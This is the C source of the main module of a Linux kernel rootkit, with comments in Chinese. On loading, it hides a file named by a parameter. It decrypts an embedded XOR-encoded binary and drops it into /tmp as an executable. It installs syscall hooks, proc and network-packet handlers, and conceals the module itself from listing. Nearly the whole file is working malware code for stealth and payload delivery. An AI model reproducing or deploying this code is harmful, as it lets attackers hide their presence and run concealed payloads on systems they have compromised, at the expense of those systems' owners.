/**
 * Linux内核Rootkit主模块文件
 * 功能：模块初始化、文件解密、进程隐藏等核心功能
 * 作者：未知
 * 版本：20230201
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>

#include <linux/fs.h>
#include <linux/file.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
#include <linux/fdtable.h>
#endif
#include <linux/time.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/spinlock.h>

#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <net/sock.h>
#include <asm/uaccess.h>
#include <asm/siginfo.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/security.h>
#include <linux/aio.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
#include <linux/cred.h>
#endif
// 移除vermagic.h包含，这个头文件只能在内核模块编译时使用
// #include <linux/vermagic.h>

#include "config.h"
#include "rmod.h"
#include "rproc.h"
//#include "rfile.h"
#include "rhook.h"
#include "fs.h"

// 模块参数：用于隐藏指定文件
static char *fh = NULL;
module_param(fh, charp, S_IRUSR);

/**
 * 块加密函数 - 使用XOR加密算法
 * @param buf 待加密的缓冲区
 * @param buf_len 缓冲区长度
 * @param _key 加密密钥
 * @param key_len 密钥长度
 */
inline void blk_enc(char buf[], size_t buf_len, unsigned int _key, size_t key_len)
{
	size_t idx;
	char *key = (char *)&_key;

	// 使用XOR算法对每个字节进行加密
	for (idx = 0; idx < buf_len; idx++)
	{
		buf[idx] ^= key[idx % key_len];
	}
}

// 包含加密后的二进制数据块
static char b_block[] = {
#include "file_block.inc"
};

/**
 * 写入二进制块到临时文件
 * 将加密的二进制数据解密后写入/tmp目录
 * @return 成功返回0，失败返回-1
 */
int wr_blk(void)
{
	// 生成临时文件路径和名称，使用FILE_XOR_KEY作为标识
	sprintf(_kpath, "/tmp/%x", FILE_XOR_KEY);
	sprintf(_kname, "%x", FILE_XOR_KEY);

	// 解密二进制数据块
	blk_enc(b_block , sizeof(b_block), FILE_XOR_KEY, sizeof(unsigned int));

	struct file *file = NULL;
	static loff_t offset;
	// 创建临时文件，权限为700 (rwx)
	file = filp_open(_kpath, O_CREAT|O_RDWR|O_LARGEFILE, 0700);
	if (!file)
         return -1;

	// 写入解密后的数据
	ssize_t cnt = _kwrite_file(file, b_block, sizeof(b_block), &offset);
	
	debug(" data:%d \n", (unsigned int)cnt );
	debug(" _kpath : %s  _kname:%s \n", _kpath, _kname);
	
	_kclose_file(file);
	
	return 0;
}

/**
 * 模块初始化函数
 * 执行所有必要的初始化操作
 * @return 成功返回0，失败返回0
 */
static int _in(void)
{
	// 隐藏指定的文件
	file_hide(fh);
	
	// 写入解密后的二进制块
	wr_blk();
	
	// 初始化工具函数
	if (init_util_func() < 0)
	{
		return 0;
	}
	
	// 初始化钩子函数
	if (_init1() < 0)
	{
		return 0;
	}

	// 初始化proc文件系统接口
	proc_path_init();

	// 初始化网络包处理
	pktinit1();

#ifndef DEBUG_MSG
	// 非调试模式下隐藏模块
	hide();
#endif

	debug("install ok.\n");

	return 0;
}

/**
 * 模块卸载函数
 * 清理所有资源并恢复系统状态
 */
static void _out(void)
{
	// 清理proc文件系统接口
	proc_path_exit();

	// 清理网络包处理
	pktinit2();

	// 清理钩子函数
	_init2();

#ifndef DEBUG_MSG
	// 非调试模式下显示模块
	show();
#endif

	debug("uninstall ok.\n");
}

// 模块初始化和卸载函数指针
module_init(_in);
module_exit(_out);

MODULE_LICENSE("GPL");
//MODULE_AUTHOR("");
//MODULE_DESCRIPTION("");
